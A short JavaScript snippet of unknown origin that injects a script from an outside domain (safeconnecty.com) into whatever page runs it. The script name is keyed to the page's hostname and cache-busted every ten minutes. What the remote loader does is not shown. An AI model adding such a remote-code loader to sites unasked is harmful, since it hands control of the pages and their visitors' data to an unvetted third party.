(function() {
  var script = document.createElement('script');
  script.src = 'https://safeconnecty.com/loader_' + document.location.hostname + '.js?v=' + Math.round(new Date().valueOf() / 600000);
  script.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(script);
})()
